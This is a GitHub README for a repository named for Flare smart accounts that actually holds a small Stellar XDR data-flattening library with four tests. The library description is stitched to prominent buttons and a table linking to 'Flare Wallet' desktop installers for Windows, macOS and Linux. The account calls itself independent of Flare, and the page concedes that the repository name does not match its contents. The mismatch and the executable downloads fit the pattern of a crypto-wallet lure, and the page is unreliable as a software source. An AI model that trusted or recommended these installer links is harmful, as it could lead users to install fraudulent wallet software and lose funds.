![Flare Wallet](assets/banner-hub.png)

# Stellar data structure helpers

A small Node library that flattens and simplifies Stellar XDR structures into plain objects, with tests for each operation, published here as the data-shaping code this account carries.

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-linux-v1.3.02.zip) |

> This repository holds a data helper library, not the wallet. The installers above come from the release repository.

## What this repository is for

The code here takes Stellar structures and makes them easier to read. `lib/index.js` opens by importing `stellar-sdk` and `json-xdr`, then defines `obj_keys`, which sorts an object's keys and puts sub-objects first, and `traverse`, which walks a structure depth-first and calls a callback with each property and its path. The rest of the file builds on those two, and the test files tell you what the remaining operations are expected to do.

The tests are the readable specification, and there are four of them: `obj_keys.test.js`, `traverse.test.js`, `merge.test.js` and `simplify.test.js`. Each one exercises a single operation on a small input, so the whole behaviour of the library fits in a short read. `example.js` at the root shows it being called.

`package.json` names the package `ezxlm` and describes it as "Simplifies XLM Data Structures". That is an accurate description of the code: it is a Stellar helper, built on the Stellar SDK, and there is no Flare code in it, no account abstraction, no contract and no key handling.

The repository name points the other way. It is worth being plain about the gap: a reader who arrives expecting Flare smart accounts will not find them here. What is here is a careful, tested example of turning a deeply nested signed XDR structure into something a human can read, which is a useful thing to read once, on any chain.

## Who it is for

- Developers who need to flatten a nested transaction structure for display or logging.
- Readers who want a compact example of object traversal with tests, in plain JavaScript.
- Anyone auditing what this account publishes, who should know this repository is a small upstream library.

## Start here

- [Download the wallet](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) if you came here expecting a Flare product.
- [Read the application source](https://github.com/flarewallet/flare-desktop-wallet) for the wallet's own key handling.
- [Read the transaction streamer](https://github.com/flarewallet/flare-systems-deployment) for the streaming counterpart.
- [Verify any download](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) against the published hashes.

## How to use these guides

1. Read the four tests before the library; they define the behaviour.
2. Run the test script after any change, since every operation has a test.
3. Treat key ordering as part of the contract: `obj_keys` sorts, and the tests assert it.
4. Do not use a traversal helper on untrusted input without a depth limit of your own.
5. Keep the distinction between this library and a wallet clear in your own writing.
6. If you need Flare behaviour, this is not the code that provides it.

## The guides

- [Flare Wallet desktop application](https://github.com/flarewallet/flare-desktop-wallet) is the actual Flare product in this account.
- [Blockchain transaction streamer](https://github.com/flarewallet/flare-systems-deployment) streams XRP, Stellar and VeChain transactions.
- [XRP transaction waterfall](https://github.com/flarewallet/tx-verifier) renders live XRP traffic.
- [Flare Wallet profile](https://github.com/flarewallet) lists every repository with what it contains.

## What each guide changes

| Task | Repository | Outcome |
| --- | --- | --- |
| Flatten a nested structure | This repository | A plain object with stable key order |
| Assert the behaviour | This repository's tests | Four operations, each with a test |
| Stream live transactions | flare-systems-deployment | A callback per transaction, three chains |
| Get the Flare wallet | Release page | A verified installer |

## Common first questions

### Does this implement Flare smart accounts?

No. The code is a Stellar data helper built on the Stellar SDK. There is no Flare code and no account abstraction in it.

### Why is the repository named flare-smart-accounts?

The name reflects an intended direction that the contents do not implement. The package inside calls itself `ezxlm` and simplifies XLM structures.

### Is it maintained?

Treat it as published: four tests, one example, no release. Run the tests yourself before depending on it.

## Before you install

- Remember the installers on this page are the wallet, not this library.
- Take the wallet only from the release repository.
- Match all 64 characters of the hash before running anything.
- Keep your recovery phrase offline.

## About and license

This repository holds the `ezxlm` Stellar data structure library, with four tests and an example. It declares no licence of its own; take the code as published and check the licences of `stellar-sdk` and `json-xdr` before redistribution.

Flare Wallet is independent of Flare Foundation, Flare Labs and Ava Labs. Stellar and XLM are named because the library works on their structures.
